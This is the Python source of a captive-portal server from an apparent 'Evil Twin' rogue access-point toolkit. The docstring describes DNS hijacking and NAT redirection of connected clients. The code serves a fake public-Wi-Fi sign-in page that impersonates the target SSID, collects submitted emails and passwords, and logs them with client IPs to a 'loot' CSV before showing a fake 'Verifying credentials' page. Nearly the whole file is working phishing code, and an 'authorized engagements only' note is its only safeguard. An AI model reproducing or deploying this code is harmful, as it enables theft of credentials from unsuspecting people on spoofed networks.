"""Captive portal HTTP server for the Evil Twin tool.

Bound to 192.168.45.1:80 (the static IP we put on the rogue-AP interface).
Iptables NAT redirects every HTTP request from connected clients to here,
plus dnsmasq DNS-hijacks every hostname to this address. The OS captive-
portal probe (Apple's captive.apple.com / Google's connectivitycheck) hits
us first and pops the "Sign in to network" prompt on the victim device.

Stays small on purpose — pure stdlib so we don't drag in flask just for
two pages. Logs every POST to loot/captive/<session_ts>.csv with a
proper timestamp + client IP.

For authorized engagements only. The orchestrator (bigbox/eviltwin.py)
is responsible for putting a "Authorized targets only" confirm in front
of the user before launching this.
"""
from __future__ import annotations

import csv
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs


LOOT_DIR = Path("loot/captive")


# A deliberately generic fake-portal page. Looks like every public-Wi-Fi
# splash you've ever seen: header, "Sign in to continue", email + password,
# accept-terms checkbox, blue-ish submit. The {ssid} substitution is
# filled in by CaptivePortal so the page references the SSID being
# impersonated.
PORTAL_HTML = """<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to {ssid}</title>
<style>
body{{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#f5f6f8;color:#222;}}
.wrap{{max-width:380px;margin:60px auto;padding:24px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);}}
h1{{margin:0 0 6px;font-size:20px;font-weight:600;}}
p.sub{{margin:0 0 22px;color:#666;font-size:14px;}}
label{{display:block;font-size:13px;color:#444;margin-bottom:4px;margin-top:14px;}}
input[type=email],input[type=password]{{width:100%;box-sizing:border-box;padding:11px 12px;border:1px solid #d8d8db;border-radius:8px;font-size:15px;}}
.terms{{font-size:12px;color:#666;margin:18px 0;display:flex;align-items:flex-start;gap:8px;}}
button{{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px;}}
.brand{{text-align:center;color:#888;font-size:12px;margin-top:20px;}}
</style>
</head><body>
<div class="wrap">
  <h1>Sign in to {ssid}</h1>
  <p class="sub">Authentication required to access the network.</p>
  <form method="POST" action="/submit">
    <label>Email or username</label>
    <input type="email" name="email" autocomplete="email" required>
    <label>Password</label>
    <input type="password" name="password" autocomplete="current-password" required>
    <div class="terms">
      <input type="checkbox" name="terms" checked required>
      <span>I agree to the network's terms of service.</span>
    </div>
    <button type="submit">Connect</button>
  </form>
  <div class="brand">{ssid} &middot; Public Wi-Fi</div>
</div>
</body></html>"""


SUBMIT_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying</title>
<style>
body{font-family:system-ui,sans-serif;background:#f5f6f8;color:#444;text-align:center;padding-top:80px;}
.wrap{max-width:320px;margin:0 auto;padding:24px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);}
h2{font-size:18px;margin:0 0 12px;}
p{font-size:14px;color:#666;}
</style>
</head><body>
<div class="wrap">
  <h2>Verifying credentials...</h2>
  <p>This may take a moment. Please keep this window open.</p>
</div>
</body></html>"""


class _Handler(BaseHTTPRequestHandler):
    server_version = "BigboxCaptive/1.0"

    # The CaptivePortal instance attaches itself to the server so we can
    # reach it from the per-request handler.
    @property
    def portal(self) -> "CaptivePortal":
        return self.server.portal  # type: ignore[attr-defined]

    def log_message(self, format: str, *args) -> None:  # noqa: A003
        # Squelch the default stderr access log; we have our own CSV.
        return

    def _send_html(self, body: str, code: int = 200) -> None:
        encoded = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(encoded)))
        # No-cache so the victim's browser doesn't keep showing a stale
        # success page if they reconnect to a real network.
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(encoded)

    def do_GET(self) -> None:  # noqa: N802
        # Anything except an obvious asset gets the portal page.
        self._send_html(PORTAL_HTML.format(ssid=self.portal.ssid))

    def do_POST(self) -> None:  # noqa: N802
        try:
            length = int(self.headers.get("Content-Length", "0") or "0")
        except ValueError:
            length = 0
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        fields = parse_qs(body, keep_blank_values=True)
        try:
            self.portal._record(self.client_address[0], fields)
        except Exception:
            pass
        self._send_html(SUBMIT_HTML)


class CaptivePortal:
    """Threaded HTTP server. Start once, stop once. Thread-safe counter."""

    def __init__(self, ssid: str, bind: str = "192.168.45.1", port: int = 80) -> None:
        self.ssid = ssid
        self.bind = bind
        self.port = port
        self.creds_captured = 0
        self.last_creds: dict[str, str] = {}
        self._csv_path: Optional[Path] = None
        self._csv_lock = threading.Lock()
        self._server: Optional[ThreadingHTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> tuple[bool, str]:
        LOOT_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        # safe-ish ssid for filename
        safe_ssid = "".join(
            c if c.isalnum() or c in "-_." else "_" for c in self.ssid
        )[:40] or "AP"
        self._csv_path = LOOT_DIR / f"captive_{safe_ssid}_{ts}.csv"
        # Header line
        with self._csv_path.open("w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["timestamp_utc", "client_ip", "ssid", "form_fields"])

        try:
            self._server = ThreadingHTTPServer((self.bind, self.port), _Handler)
            self._server.portal = self  # type: ignore[attr-defined]
        except OSError as e:
            return False, f"bind {self.bind}:{self.port} failed: {e}"

        self._thread = threading.Thread(
            target=self._server.serve_forever, daemon=True
        )
        self._thread.start()
        return True, f"captive portal up on {self.bind}:{self.port}"

    def stop(self) -> None:
        if self._server:
            try:
                self._server.shutdown()
                self._server.server_close()
            except Exception:
                pass
        self._server = None
        if self._thread:
            try:
                self._thread.join(timeout=2.0)
            except Exception:
                pass
        self._thread = None

    def _record(self, client_ip: str, fields: dict[str, list[str]]) -> None:
        # Flatten parse_qs's list values to plain strings for CSV; preserve
        # the original key order by iterating fields directly.
        flat = {k: (v[0] if v else "") for k, v in fields.items()}
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        with self._csv_lock:
            self.creds_captured += 1
            self.last_creds = flat
            if self._csv_path:
                try:
                    with self._csv_path.open("a", newline="") as f:
                        w = csv.writer(f)
                        # Encode fields as k=v;k=v so a single column is enough
                        encoded = ";".join(f"{k}={v}" for k, v in flat.items())
                        w.writerow([ts, client_ip, self.ssid, encoded])
                except Exception:
                    pass

    @property
    def csv_path(self) -> Optional[Path]:
        return self._csv_path
